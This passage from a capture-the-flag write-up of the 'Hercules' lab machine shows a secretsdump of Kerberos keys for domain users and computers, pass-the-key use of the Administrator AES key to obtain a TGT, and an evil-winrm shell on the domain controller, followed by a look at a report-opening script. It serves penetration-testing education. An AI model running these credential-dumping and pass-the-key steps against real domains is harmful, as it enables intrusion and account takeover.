hercules.htb\tish.c:des-cbc-md5:ba86fef4fb07c279
hercules.htb\jennifer.a:aes256-cts-hmac-sha1-96:89f43c3e2e6f276159fdb2e2196bf37aa57c6a701a998829ce77b847e0c0347b
hercules.htb\jennifer.a:aes128-cts-hmac-sha1-96:e9d8de0b0543f65514f5caf5070d3385
hercules.htb\jennifer.a:des-cbc-md5:2f686779d01cb90e
hercules.htb\shae.j:aes256-cts-hmac-sha1-96:d9bbef8adf738b68ff3ddf404d4883d381aa19f050d740178b98585cdd702609
hercules.htb\shae.j:aes128-cts-hmac-sha1-96:960127296ec121040cfabdab2655bd52
hercules.htb\shae.j:des-cbc-md5:ade3e66ef2206880
hercules.htb\joel.c:aes256-cts-hmac-sha1-96:4e8151abee9601cbe483074e7b4f81c42e84212c6643deb1e7185121f56096d1
hercules.htb\joel.c:aes128-cts-hmac-sha1-96:cf2cf63f803c325c16b7a5231590a7ad
hercules.htb\joel.c:des-cbc-md5:e9c8fd49d90ba10b
hercules.htb\jacob.b:aes256-cts-hmac-sha1-96:f8eefb4959850a0deaf143a61287c424da7ebd8ee7ce3b634379b92fe237fa4e
hercules.htb\jacob.b:aes128-cts-hmac-sha1-96:1151ec1eca77cada4eb4ea598ee27148
hercules.htb\jacob.b:des-cbc-md5:3b0857d5c8d50134
hercules.htb\web_admin:aes256-cts-hmac-sha1-96:c6058e481e35910accaf63a279e3932cc8bc4c1f79cee8ffad03c286234336ef
hercules.htb\web_admin:aes128-cts-hmac-sha1-96:ce9db3f7fe9967c384f4bb0f7b97960a
hercules.htb\web_admin:des-cbc-md5:7f6e4cd91c08c8df
hercules.htb\bob.w:aes256-cts-hmac-sha1-96:59a5880cf9d8be2b955ae135494077d61fab893638eea633eab4b5c81e784571
hercules.htb\bob.w:aes128-cts-hmac-sha1-96:1a687d999e4198a965918758c3f8cce1
hercules.htb\bob.w:des-cbc-md5:f1df7a911c75945b
hercules.htb\ken.w:aes256-cts-hmac-sha1-96:17249fa7febeb8a84fc70d418e7c0c898ebef5583756cd498d547df3d9495211
hercules.htb\ken.w:aes128-cts-hmac-sha1-96:72bc6bb48c7c5312703924899fc60cc3
hercules.htb\ken.w:des-cbc-md5:f2384f6d4c5b75b0
hercules.htb\johnathan.j:aes256-cts-hmac-sha1-96:c52bca3f1343c33bb37200a87a26e8046c03ac768744bc6568d9c653d7b0f5ea
hercules.htb\johnathan.j:aes128-cts-hmac-sha1-96:5710dab9467947e446f654672ff98d84
hercules.htb\johnathan.j:des-cbc-md5:9e495776a75b5eba
hercules.htb\harris.d:aes256-cts-hmac-sha1-96:242b4b2960d5e45e02ae9575a06815c1038eecb748c070ba719a6f9dcd799e96
hercules.htb\harris.d:aes128-cts-hmac-sha1-96:12a6b6553154dfdad035d65479b804dc
hercules.htb\harris.d:des-cbc-md5:25a204d325019437
hercules.htb\ray.n:aes256-cts-hmac-sha1-96:865b66f58f0b3a528ba3b4fdf3f41c7a32df25bfde5b58f197fada5d854bba4f
hercules.htb\ray.n:aes128-cts-hmac-sha1-96:a522ccba1e2e6eba9340fbd857e70f9a
hercules.htb\ray.n:des-cbc-md5:620bcd01d9d0eae5
hercules.htb\natalie.a:aes256-cts-hmac-sha1-96:96c1eecee203a3f461d73450cc2f8973c66e947ca2327adba6697188bedf6f1d
hercules.htb\natalie.a:aes128-cts-hmac-sha1-96:691f532656d93730b32c68e5410fe549
hercules.htb\natalie.a:des-cbc-md5:1591b576f8a74646
hercules.htb\ramona.l:aes256-cts-hmac-sha1-96:40c14521627c473a0cefa7c81491443d98fd685b6758a79cab5e2b48d4fd349f
hercules.htb\ramona.l:aes128-cts-hmac-sha1-96:dc0490ede5dfbee7ea7bca4eb7178a95
hercules.htb\ramona.l:des-cbc-md5:b9e302ab49a21ac2
hercules.htb\fiona.c:aes256-cts-hmac-sha1-96:cd914a62c5742dcd5cd1440228188045f8e173395210b23e2c8393d5f05fd1ad
hercules.htb\fiona.c:aes128-cts-hmac-sha1-96:38811dcdc8cd2cb426321c1500b21085
hercules.htb\fiona.c:des-cbc-md5:d64a6e6475267008
hercules.htb\patrick.s:aes256-cts-hmac-sha1-96:2c2068e619487a205eab14e4d5bf5052c8376a36c78cd866b2cfdd9bf42d0ceb
hercules.htb\patrick.s:aes128-cts-hmac-sha1-96:609b2cd845b751ebee40d729693f2fea
hercules.htb\patrick.s:des-cbc-md5:2ac4291ae36bdc38
hercules.htb\tanya.r:aes256-cts-hmac-sha1-96:f93584d24b6563ae5f706d97017beef9d1da0ed006cf8222f7d4cdee1a0228da
hercules.htb\tanya.r:aes128-cts-hmac-sha1-96:37c87d3c4074eecb525e563e088099c5
hercules.htb\tanya.r:des-cbc-md5:196238cd6da489b6
Admin:aes256-cts-hmac-sha1-96:e420c6133c98dcdfa42a8b9ad80fa780d5dc55f0566d1ba46d99348095c28fd2
Admin:aes128-cts-hmac-sha1-96:44f4f0d4c7afe4fdc0368bdc0e81b7f9
Admin:des-cbc-md5:6298e35e4c94e580
DC$:aes256-cts-hmac-sha1-96:88fb79ee960899e23659745a482984b1f793703661c72e2409b9bd8b5326c8d0
DC$:aes128-cts-hmac-sha1-96:201217d9fb7a22353ddf05badaa52304
DC$:des-cbc-md5:921949c2ae432c70
WINSRV01-2016$:aes256-cts-hmac-sha1-96:6377f37def6a599880dc680a895976b18787c5a9c7d50a7d04fe8cd106c95122
WINSRV01-2016$:aes128-cts-hmac-sha1-96:1e2eea3b85497b239fcb13e60aec6d8a
WINSRV01-2016$:des-cbc-md5:d5134a61734ca71a
WINSRV02-2016$:aes256-cts-hmac-sha1-96:93c2c14e26f5e1ff7472cf3649764ae7158ddf4cd0b0fee17c51b5b7d5040039
WINSRV02-2016$:aes128-cts-hmac-sha1-96:59402b2d1610a6aef3b2079a9366048b
WINSRV02-2016$:des-cbc-md5:1304a43bab75b6e9
WINSRV03-2016$:aes256-cts-hmac-sha1-96:bea623e82ebd8ece87122335ac204482dc6bc8485da564b70bc89068da971600
WINSRV03-2016$:aes128-cts-hmac-sha1-96:4acab4bc95d384f149e378377f9b0ea5
WINSRV03-2016$:des-cbc-md5:ea07c7703720a1cb
ENTERPRISE01-8.1$:aes256-cts-hmac-sha1-96:d98fd42e1c7e0c38b1cefd75923bbd077a9c7214348c05d5d7a4782e50441a52
ENTERPRISE01-8.1$:aes128-cts-hmac-sha1-96:2ff78d882f09acd03c05e139058acb66
ENTERPRISE01-8.1$:des-cbc-md5:6d9ed3da64d0fbbc
ENTERPRISE02-8.1$:aes256-cts-hmac-sha1-96:9eb027b76c9f9cf8fe0803258d1feb6692e8dc9ca33ca5e10c4e55d89f4fc0ee
ENTERPRISE02-8.1$:aes128-cts-hmac-sha1-96:53e86e206756760f7399f652f22c16f1
ENTERPRISE02-8.1$:des-cbc-md5:d3c8ece0434f7692
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x718dac158860>
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 172, in __del__
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 169, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 410, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 1364, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/Cryptodome/Cipher/AES.py", line 229, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x718dac158860>
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 172, in __del__
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 169, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 410, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 1364, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/Cryptodome/Cipher/AES.py", line 229, in new
KeyError: 'Cryptodome.Cipher.AES'
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

The service ticket I already have is only good for `cifs/DC`, and WinRM needs a different SPN, so I need a TGT. Given the disabling of NTLM on the domain, I’ll get the AES key from the dump for the Administrator user and use that:

```
oxdf@hacky$ getTGT.py 'HERCULES.HTB/Administrator@dc.hercules.htb' -aesKey 6d25866356feeea0abf920fd58fccf03
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator@dc.hercules.htb.ccache
```

Now I can use that to get a shell:

```typescript
oxdf@hacky$ KRB5CCNAME=Administrator@dc.hercules.htb.ccache evil-winrm-py -i DC.hercules.htb --ssl
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC.hercules.htb:5986' as 'Administrator@HERCULES.HTB'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

The flag is on the Admin user’s desktop (consistent with the information given in the [initial machine information](#box-info)):

```
evil-winrm-py PS C:\Users\Admin\Desktop> cat root.txt
42cc2131************************
```

## Beyond Root

The script that runs as natalie.a to open ODT files is located in `C:\Users\natalie.a\AppData\Local\Windows` as `View Reports.ps1`:

```powershell
$folder = "C:\inetpub\reports"
$odtFiles = Get-ChildItem -Path $folder -Filter *.odt -File

$libre = "C:\Program Files\LibreOffice\program\soffice.exe"

foreach ($file in $odtFiles){
        $process = Start-Process -FilePath $libre -ArgumentList "--headless", "--nologo", "--norestore", "`"$($file.FullName)`"" -Passthru
        Start-Sleep -Seconds 25
        taskkill /IM "soffice.exe" /F > $null 2>&1
        taskkill /IM "soffice.bin" /F > $null 2>&1
        remove-item -path $file.FullName -Force
}
```

Clearly it is only looking for ODT files, ignoring `.docx` entirely.

This also explains the leftover `.~lock.` files in `Reports`:

```sql
evil-winrm-py PS C:\inetpub\Reports> ls -force

    Directory: C:\inetpub\Reports

Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a-h--         9/17/2026  11:45 AM             97 .~lock.413d6143-166e-4558-bf9b-c3e665b489cd.odt#                      
-a-h--         9/17/2026   9:49 AM             97 .~lock.c53e7776-a30b-4095-8950-79bd9b061ff1.odt#                      
-a----         9/17/2026   9:59 AM          37637 01817013-2111-47d3-8af0-3eaa88f931a5.docx                             
-a----         9/17/2026   5:08 AM          44136 17c03353-42b1-4922-b461-633d2c6b677b.docx                             
-a----         9/17/2026   9:40 AM          36667 712acb3c-479d-4d75-9c4f-425e4ffe9f77.docx                             
-a----         9/17/2026   9:39 AM          37058 7cbc344c-1510-4c78-a7be-cff8234097b7.docx                             
-a----         9/17/2026  10:26 AM          10218 8a049229-238d-44cd-a925-eed9baa71cb2.docx                             
-a----         9/17/2026   9:36 AM           1881 a0425f09-072e-4172-9b05-dddd8d58fda8.docx                             
-a----         9/17/2026   9:38 AM          37061 d42a9d80-a375-4bdd-bfa1-cdfb139058a4.docx                             
-a----         9/17/2026  10:23 AM          26285 ebde4623-6a61-4cac-86ad-473a88980593.docx                             
-a----         9/17/2026  10:30 AM          10224 ff8750e5-7ec1-4abb-a6fc-81cbd34b8b52.docx   
```

`soffice.exe` creates these files when it opens the document. `taskkill /F` issues a hard kill on `soffice.exe`, which means it doesn’t get the chance to clean up. These files contain metadata about who has the document open:

```
evil-winrm-py PS C:\inetpub\Reports> cat .~lock.413d6143-166e-4558-bf9b-c3e665b489cd.odt#
,HERCULES/natalie.a,dc,17.09.2026 11:45,file:///C:/Users/natalie.a/AppData/Roaming/LibreOffice/4;
```
